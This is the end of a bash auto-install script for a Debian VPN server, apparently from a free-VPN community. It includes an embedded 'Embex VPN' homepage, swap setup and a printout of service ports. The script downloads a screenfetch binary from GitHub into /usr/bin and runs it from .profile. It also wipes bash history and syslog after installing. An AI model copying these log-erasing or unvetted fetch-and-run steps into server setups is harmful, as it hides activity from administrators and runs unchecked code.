                            WENZ VPN<br><a href="https://play.google.com/store/apps/details?id=wenz.soft.dev.wenzvpn" class="mr-2" target="_blank"><img src="img/google-play.png" class="store-img"/></a><br>
                            Configs PH<br><a href="https://play.google.com/store/apps/details?id=fb.com.nicanor03" class="mr-2" target="_blank"><img src="img/google-play.png" class="store-img"/></a><br>
							<br>FOR PC<br><a href="https://www.phcorner.net/threads/685100/" target="_blank">Uni OVPN (&#169; JustPlaying)</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>

        <!--team-->
        <section class="bg-white" id="team">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 col-sm-8 mx-auto text-center">
                        <h2 class="text-primary">Our Team</h2>
                        <p class="lead pt-3">
                            Meet our awesome team.
                        </p>
                    </div>
                </div>
                <div class="row d-md-flex mt-5 text-center">
                    <div class="team col-sm-3 mt-2 wow fadeInLeft">
                        <img src="img/team-1.gif" alt="Owner" class="img-team img-fluid rounded-circle"/>
                        <h5>Embex | KDS</h5>
                        <p>Developer, Owner</p>
                    </div>
                    <div class="team col-sm-3 mt-2 wow fadeIn">
                        <img src="img/team-2.jpg" alt="Team Epiphany" class="img-team img-fluid rounded-circle"/>
                        <h5>Team Epiphany</h5>
                        <p>Our Official Group Name</p>
                    </div>
                    <div class="team col-sm-3 mt-2 wow fadeIn">
                        <img src="img/team-3.gif" alt="Embex" class="img-team img-fluid rounded-circle"/>
                        <h5>EMBEX TEAM</h5>
                        <p>Partner Team</p>
                    </div>
                    <div class="team col-sm-3 mt-2 wow fadeInRight">
                        <img src="img/team-4.png" alt="Team Unstoppable" class="img-team img-fluid rounded-circle"/>
                        <h5>Team Unstoppable</h5>
                        <p>Partner Team</p>
                    </div>
                </div>
            </div>
        </section>

        <!--blog-->
        <section class="bg-light" id="links">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 offset-md-3 col-sm-8 offset-sm-2 col-xs-12 text-center">
                        <h2 class="text-primary">Links</h2>
                        <p class="lead pt-3">
                            Our recommended and partner sites.
                        </p>
                    </div>
                </div>
                <div class="row d-md-flex mt-5">
                    <div class="col-sm-4 mt-2 wow fadeIn">
                        <div class="card">
                            <img class="card-img-top" src="img/pt.png" alt="PinoyThread">
                            <div class="card-body">
                                <p class="card-text text-muted small-xl">
                                    <em class="ion-ios-calendar-outline"></em>&nbsp;&nbsp;
                                    <em class="ion-ios-person-outline"></em>  &nbsp;&nbsp;
                                    <em class="ion-ios-time-outline"></em>
                                </p>
                                <h5 class="card-title"><a href="https://www.pinoythread.com" target="_blank">Join PinoyThread Forum!</a></h5>
                                <p class="card-text">Welcome to PinoyThread. Come and join discuss about the pinoy cyber world.<br>FREE VPNs<br>Giveaways<br>Droplets<br>more...</p>
                            </div>
                            <div class="card-body text-right">
                                <a href="https://www.pinoythread.com" class="card-link" target="_blank"><strong>Join now</strong></a>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-4 mt-2 wow fadeIn">
                        <div class="card">
                            <img class="card-img-top" src="img/radz.png" alt="RADZ VPN">
                            <div class="card-body">
                                <p class="card-text text-muted small-xl">
                                    <em class="ion-ios-calendar-outline"></em> &nbsp;&nbsp;
                                    <em class="ion-ios-person-outline"></em> &nbsp;&nbsp;
                                    <em class="ion-ios-time-outline"></em>
                                </p>
                                <h5 class="card-title"><a href="https://radzvpn.ml/" target="_blank">Finally! RADZ VPN</a></h5>
                                <p class="card-text">New Web Design<br>
								Can create up to 50 accounts every server per day<br>
								3 VIP Fast Servers Available<br>
								Fast and Easy to create account<br>
								Customer Service Chat Box Plugins<br>
								You can able to check your account info</p>
                            </div>
                            <div class="card-body text-right">
                                <a href="https://radzvpn.ml/" class="card-link"target="_blank"><strong>Visit now</strong></a>
                            </div>
                        </div>
                    </div>
                    <div class="col-sm-4 mt-2 wow fadeIn">
                        <div class="card">
                            <img class="card-img-top" src="img/te.jpg" alt="Our Discord server">
                            <div class="card-body">
                                <p class="card-text text-muted small-xl">
                                    <em class="ion-ios-calendar-outline"></em>&nbsp;&nbsp;
                                    <em class="ion-ios-person-outline"></em> &nbsp;&nbsp;
                                    <em class="ion-ios-time-outline"></em>
                                </p>
                                <h5 class="card-title"><a href="https://discord.gg/EHq4XjH" target="_blank">The TEAM Epiphany</a></h5>
                                <p class="card-text"><b>TEAM Epiphany<b> is now live on Discord with...<br>
								VPN Scripts<br>
								Daily Giveaways<br>
								Friendly members<br>
								VPN Configs<br>
								Source Codes<br>
								Bins & VPS<br>
								A tons of richness of features<br>
								that you can't find here!</p>
                            </div>
                            <div class="card-body text-right">
                                <a href="https://discord.gg/EHq4XjH" class="card-link" target="_blank"><strong>Connect to them</strong></a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>

        <!--contact-->
        <section class="bg-texture-collage p-0" id="contact">
            <div class="container">
                <div class="row d-md-flex text-white text-center wow fadeIn">
                    <div class="col-sm-4 p-5">
                        <p><em class="ion-ios-telephone-outline icon-md"></em></p>
                        <p class="lead"><a href="https://discord.gg/EHq4XjH" target="_blank"><font color="#0000EE">Discord</font></a></p>
                    </div>
                    <div class="col-sm-4 p-5">
                        <p><em class="ion-ios-email-outline icon-md"></em></p>
                        <p class="lead">Embex@embex.online</p>
                    </div>
                    <div class="col-sm-4 p-5">
                        <p><em class="ion-ios-location-outline icon-md"></em></p>
                        <p class="lead">Jakarta, ID</p>
                    </div>
                </div>
            </div>
        </section>

        <!--footer-->
        <section class="bg-footer" id="connect">
            <div class="container">
                <div class="row">
                    <div class="col-md-6 offset-md-3 col-sm-8 offset-sm-2 col-xs-12 text-center wow fadeIn">
                        <h1>Embex VPN</h1>
			<br>
			<iframe src="https://discordapp.com/widget?id=499555022078607360&amp;theme=dark" width="350" height="500" allowtransparency="true" frameborder="0"></iframe>
			<br>
                        <p class="mt-4">
                            <a href="https://discord.gg/EHq4XjH" target="_blank"><img src="img/discord.png" alt="Our Discord server"/></a>   
                            <a href="https://www.facebook.com/RADZ-VPN-260317881583057" target="_blank"><img src="img/facebook.png" alt="Our Facebook"/></a>
                           
                        </p>
                        <p class="pt-2 text-muted">
                            &copy; 2019 <a href="http://www.phcorner.net/members/446411/" target="_blank">Embex</a>
                        </p>
                    </div>
                </div>
            </div>
        </section>

        <script src="https://raw.githubusercontent.com/radzvpn/TNTNOLOADDNS/master/jquery-3.1.1.min.js></script>
        <script src="https://raw.githubusercontent.com/radzvpn/TNTNOLOADDNS/master/umdpopper.min.js"></script>
        <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta.2/js/bootstrap.min.js"></script>
        <script src="https://raw.githubusercontent.com/radzvpn/TNTNOLOADDNS/master//jquery.easing.min.js"></script>
        <script src="https://raw.githubusercontent.com/radzvpn/TNTNOLOADDNS/master/wow.js"></script>
        <script src="js/scripts.js"></script>
    </body>
</html>
END

# Unpack Embex homepage
cd /home/vps/public_html
wget "https://raw.githubusercontent.com/radzvpn/TNTNOLOADDNS/master/hiratechihomepage.zip"
unzip hiratechihomepage.zip
rm hiratechihomepage.zip
cd

# Setting server local time
ln -fs /usr/share/zoneinfo/$MyVPS_Time /etc/localtime

# Running screenfetch
wget -O /usr/bin/screenfetch "https://raw.githubusercontent.com/vpsiix/AutoScriptDebian/master/Files/Plugins/screenfetch"
chmod +x /usr/bin/screenfetch
echo "/bin/bash /etc/openvpn/openvpn.bash" >> .profile
echo "clear" >> .profile
echo "screenfetch" >> .profile

# Adding Swap file
sudo dd if=/dev/zero of=/swapfile bs=1024 count=1048576
sudo chmod 600 /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
echo "/swapfile swap swap defaults 0 0" >> /etc/fstab
sudo sysctl vm.swappiness=10
echo "vm.swappiness=10" >> /etc/sysctl.conf
sudo sysctl -p

# Clearing all logs from installation
rm -rf /root/.bash_history && history -c && echo '' > /var/log/syslog
cd

# Showing additional information from installating this script
echo -e ""
echo -e ""
linux_logo -l
echo -e ""
echo -e " ======================================="
echo -e "  Facebook https://fb.com/ahmadfauzanhabibi"
echo -e "  Github https://github.com/vpsiix"
echo -e "  Donations https://paypal.me/ahmadfauzanhabibi"
echo -e " ======================================="
echo -e ""
echo -e " Success Install AutoScript Debian to $IPADDR"
echo -e ""
echo -e ""
echo -e " Service Ports: "
echo -e " OpenSSH = $SSH_Port1, $SSH_Port2, SSL  $Stunnel_Port1"
echo -e " DropbearSSH = $Dropbear_Port1, $Dropbear_Port2, SSL  $Stunnel_Port2"
echo -e " Privoxy = $Privoxy_Port1 , $Privoxy_Port2"
echo -e " Squid = $Squid_Port1 , $Squid_Port2"
echo -e " Webmin = http://$IPADDR:10000"
echo -e ""
echo -e " ======================================="
echo -e " Copyright Â© VPSIIX 2017 - $YearNow"
echo -e " ======================================="
echo -e ""
rm -f DebianX*
